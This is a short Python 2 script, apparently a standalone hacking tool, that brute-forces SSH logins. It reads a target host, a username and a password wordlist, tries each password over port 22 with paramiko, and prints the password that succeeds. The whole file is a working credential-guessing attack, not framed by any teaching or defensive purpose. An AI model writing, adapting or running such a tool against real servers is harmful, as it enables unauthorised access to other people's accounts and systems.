import os
import socket
import sys
import paramiko
global host, username, line, input_file

line ="\n...................................\n"

try:
    host =raw_input("[*] Enter Target Host Address :")
    username = raw_input("[*] Enter SSH Username: ")
    input_file = raw_input("[*] Enter SSH Password File: ")
	
    if os.path.exists(input_file) == False:
	print "\n[*] File Path Does Not Exist!"
	sys.exit(4)
except KeyboardInterrupt: #prevents python from stopping our program execution
    print "\n\n[*] User Requsted An Interrupt"
    sys.exit(3)
	
def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
       	ssh.connect(host, port=22, username=username, password=password) #I will use SSH default port
    except paramiko.AuthenticationException:
       	#[*] Authentication Failed!
       	code=1
    except socket.error, e:
       	#[*] Connection Failed, host offine
       	code = 2
    ssh.close()
    return code
	
input_file = open(input_file)

for i in input_file.readlines():
    password = i.strip("\n")
    
    try:
        response = ssh_connect(password)
        if response == 0:
            print "%s[*] User: %s [*] Password Found: %s%s" % (line, username, password, line)
	    sys.exit(0)
        elif response == 1:
            print "[*] User: %s [*] Password: %s => Login Incorrect! <=" % (username, password)
        elif response == 2:
            print "[*] Connection could not be established to address: %s" % (host)
            sys.exit(2)
    except Exception, e:
        print e
        pass
input_file.close()
